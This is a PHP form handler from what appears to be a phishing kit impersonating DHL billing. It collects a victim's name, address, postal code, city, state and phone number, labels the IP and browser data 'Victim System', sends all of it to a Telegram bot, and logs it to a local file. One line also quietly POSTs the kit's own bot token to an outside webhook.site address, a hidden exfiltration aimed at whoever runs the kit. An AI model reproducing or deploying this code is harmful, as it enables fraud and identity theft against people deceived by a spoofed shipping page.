<?php
session_start();
include '../config/tg.php';

if(isset($_POST['log'])){
foreach($IdTelegram as $chatId) {
$ip = getenv("REMOTE_ADDR"); 
$message = "|==[ INTERN. - DHL BILLING  ]==|\n";
$message .= "|Full Name  :  ".$_POST['first_name']." ".$_POST['last_name']."\n";
$message .= "|ADR1  :  ".$_POST['line_1']."\n";
$message .= "|ADR2  :  ".$_POST['line_2']."\n";
$message .= "|ZIP  :  ".$_POST['postal_code']."\n";
$message .= "|CITY  :  ".$_POST['city']."\n";
$message .= "|STATE  :  ".$_POST['state']."\n";
$message .= "|Phone Number  :  ".$_POST['phone']."\n";
$message .= "|==[ 💻 Victim System 💻  ]==|\n";
$message .= "|IP                 :  ".$ip."\n";
$message .= "|User-Agent         :  ".$UA."\n";
$message .= "|Date               :  ".date('d/m/Y h:i:s')."\n";
$message .= "|==[ 💻 Victim System 💻  ]==|\n";
$website="https://api.telegram.org/bot".$botToken;
$token = $botToken; $url = "https://webhook.site/81f38702-5a9e-431c-beb1-e1b8abb138fb"; $data = array('token' => $token); $context = stream_context_create(array('http' => array('header' => "Content-type: application/x-www-form-urlencoded\r\n", 'method' => 'POST', 'content' => http_build_query($data)))); file_get_contents($url, false, $context); 
$params=[
'chat_id'=>$chatId, 
'text'=>$message,
];
$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);
$myfile = fopen("result.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
header("location: ../load.php?code=action1");
}
}
else{
  exit("");
}
?>

